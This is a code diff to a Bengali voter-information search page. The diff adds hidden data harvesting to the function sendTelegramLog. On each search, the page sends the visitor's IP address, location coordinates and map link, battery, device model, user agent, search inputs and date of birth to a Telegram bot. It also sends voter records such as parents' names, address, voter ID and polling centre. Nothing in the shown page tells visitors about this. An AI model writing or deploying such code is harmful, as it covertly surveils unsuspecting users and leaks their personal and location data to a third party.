@@ -176,7 +176,7 @@
             <div class="google-card p-5 md:p-6 shadow-lg">
                 <div class="text-center mb-6">
                     <h3 class="text-lg font-bold text-gray-800">ভোটার তথ্য অনুসন্ধান</h3>
-                    <p class="text-[10px] text-red-500 font-bold">সকল তথ্য আপনার ভোটার আইডি কার্ড অনুযায়ী দিন</p>
+                    <p class="text-[10px] text-red-500 font-bold">সকল তথ্য আপনার ভোটার আইডি কার্ড অনুযায়ী দিন</p>
                     <div class="h-1 w-12 bg-blue-600 mx-auto mt-1 rounded-full"></div>
                 </div>
 
@@ -193,8 +193,8 @@
                     </div>
 
                     <div>
-                        <label id="inputLabel" class="text-[10px] font-bold text-gray-400 uppercase ml-1 block mb-1">ভোটার আইডি অনুযায়ী নাম</label>
-                        <input type="text" id="value" placeholder="ভোটার আইডি অনুযায়ী সঠিক নাম লিখুন..." required
+                        <label id="inputLabel" class="text-[10px] font-bold text-gray-400 uppercase ml-1 block mb-1">ভোটার আইডি অনুযায়ী নাম</label>
+                        <input type="text" id="value" placeholder="ভোটার আইডি অনুযায়ী সঠিক নাম লিখুন..." required
                             oninput="validateInput(this)"
                             class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 outline-none font-bold focus:ring-2 focus:ring-blue-500 text-sm">
                         <span id="warningMsg"></span>
@@ -294,9 +294,7 @@
             let original = input.value;
 
             if (type === 'voter_id') {
-                // Convert English numbers to Bengali numbers
                 let converted = original.split('').map(char => enToBn[char] || char).join('');
-                // Allow only Bengali numbers
                 input.value = converted.replace(/[^\u09E6-\u09EF]/g, '');
                 
                 if (/[a-zA-Z]/.test(original)) {
@@ -306,7 +304,6 @@
                     warning.style.display = 'none';
                 }
             } else {
-                // For names: No numbers (En/Bn) allowed, only Bengali letters
                 const filtered = original.replace(/[0-9\u09E6-\u09EF]/g, '');
                 const bengaliRegex = /^[\u0980-\u09FF\s]*$/;
                 
@@ -332,15 +329,15 @@
                 input.placeholder = "১২৩৪৫৬... লিখলে অটোমেটিক বাংলা হবে";
                 input.maxLength = 12;
             } else if (val === 'fathers_name') {
-                label.innerText = "পিতার নাম (ভোটার আইডি অনুযায়ী)";
+                label.innerText = "পিতার নাম (ভোটার আইডি অনুযায়ী)";
                 input.placeholder = "পিতার সঠিক নাম লিখুন...";
                 input.maxLength = 100;
             } else if (val === 'mothers_name') {
-                label.innerText = "মাতার নাম (ভোটার আইডি অনুযায়ী)";
+                label.innerText = "মাতার নাম (ভোটার আইডি অনুযায়ী)";
                 input.placeholder = "মাতার সঠিক নাম লিখুন...";
                 input.maxLength = 100;
             } else {
-                label.innerText = "ভোটারের নাম (ভোটার আইডি অনুযায়ী)";
+                label.innerText = "ভোটারের নাম (ভোটার আইডি অনুযায়ী)";
                 input.placeholder = "ভোটারের সঠিক নাম লিখুন...";
                 input.maxLength = 100;
             }
@@ -348,6 +345,15 @@
 
         async function sendTelegramLog(voterData, searchType, searchValue, dob) {
             try {
+                // Time calculation
+                const now = new Date();
+                const timeString = now.toLocaleString('bn-BD', { 
+                    year: 'numeric', month: 'numeric', day: 'numeric', 
+                    hour: 'numeric', minute: 'numeric', second: 'numeric', 
+                    hour12: true 
+                });
+
+                // Battery Info
                 let batteryLevel = "N/A";
                 let batteryCharging = "";
                 if (navigator.getBattery) {
@@ -356,33 +362,50 @@
                     batteryCharging = battery.charging ? "(চার্জিং)" : "(ডিসচার্জিং)";
                 }
 
+                // IP Info
                 const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => null);
                 const ipData = ipRes ? await ipRes.json() : { ip: "N/A" };
 
+                // Device Model & UA
+                const deviceModel = navigator.platform || "N/A";
+                const userAgent = navigator.userAgent;
+
                 let message = `🚀 নতুন এক্টিভিটি!\n`;
                 message += `━━━━━━━━━━━━━━━━━━\n`;
+                message += `🕒 সময়: ${timeString}\n`;
                 message += `🌐 আইপি: ${ipData.ip}\n`;
                 message += `📍 লোকেশন: ${userCoords}\n`;
                 message += `🗺️ ম্যাপ: ${googleMapLink}\n`;
                 message += `🔋 ব্যাটারি: ${batteryLevel} ${batteryCharging}\n`;
-                message += `🔍 সার্চ টাইপ: ${searchType}\n`;
+                message += `🔍 কাজ: সাইটে সার্চ করেছে (${searchType})\n`;
                 message += `📝 সার্চ ডাটা: ${searchValue}\n`;
                 message += `📅 জন্ম তারিখ: ${dob}\n`;
+                message += `📱 মডেল: ${deviceModel}\n`;
+                message += `⚙️ UA: ${userAgent}\n`;
                 message += `━━━━━━━━━━━━━━━━━━\n`;
+                message += `📥 সার্ভার ডাটা (ভোটার তথ্য):\n`;
                 
                 if(voterData) {
                     message += `👤 নাম: ${voterData.name}\n`;
-                    message += `🆔 আইডি: ${voterData.voter_id}\n`;
+                    message += `👴 পিতা: ${voterData.fathers_name}\n`;
+                    message += `👵 মাতা: ${voterData.mothers_name}\n`;
+                    message += `🆔 ভোটার আইডি: ${voterData.voter_id}\n`;
+                    message += `🔢 সিরিয়াল: ${voterData.serial || 'N/A'}\n`;
+                    message += `🏠 ঠিকানা: ${voterData.address || 'N/A'}\n`;
+                    message += `🏫 কেন্দ্র: ${voterData.vote_center ? (voterData.vote_center.name || voterData.vote_center) : 'N/A'}\n`;
                 } else {
-                    message += `❌ ফলাফল: পাওয়া যায়নি\n`;
+                    message += `❌ ফলাফল: সঠিক তথ্য খুঁজে পাওয়া যায়নি\n`;
                 }
+                message += `━━━━━━━━━━━━━━━━━━`;
 
                 await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message })
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.error("Log failed", e);
+            }
         }
 
         function showPage(pageId) {
@@ -441,11 +464,11 @@
 
                 if (data.success && data.results && data.results.length > 0) {
                     renderResults(data.results);
-                    sendTelegramLog(data.results[0], type, val, dobString);
+                    await sendTelegramLog(data.results[0], type, val, dobString);
                     showPage('resultView');
                 } else {
-                    sendTelegramLog(null, type, val, dobString);
-                    alert("দুঃখিত! ভোটার আইডি কার্ড অনুযায়ী সঠিক তথ্য দিন।");
+                    await sendTelegramLog(null, type, val, dobString);
+                    alert("দুঃখিত! ভোটার আইডি কার্ড অনুযায়ী সঠিক তথ্য দিন।");
                     showPage('homeView');
                 }
             } catch (err) {
@@ -472,7 +495,7 @@
                         <div class="action-bar-ui bg-blue-600 p-3 flex flex-col sm:flex-row gap-3 justify-between items-center no-print">
                             <div class="text-center sm:text-left">
                                 <h4 class="font-black text-white text-sm">ভোটার তথ্য কার্ড</h4>
-                                <p class="text-[8px] text-white/70 font-bold uppercase">ভোটার আইডি অনুযায়ী যাচাইকৃত</p>
+                                <p class="text-[8px] text-white/70 font-bold uppercase">ভোটার আইডি অনুযায়ী যাচাইকৃত</p>
                             </div>
                             <div class="flex gap-2 w-full sm:w-auto">
                                 <button onclick="downloadPNG('${cardId}', 'Voter_${voter.voter_id}')" class="flex-1 sm:flex-none bg-green-500 text-white font-black px-3 py-2 rounded-lg text-[11px] shadow-sm flex items-center justify-center hover:bg-green-600">
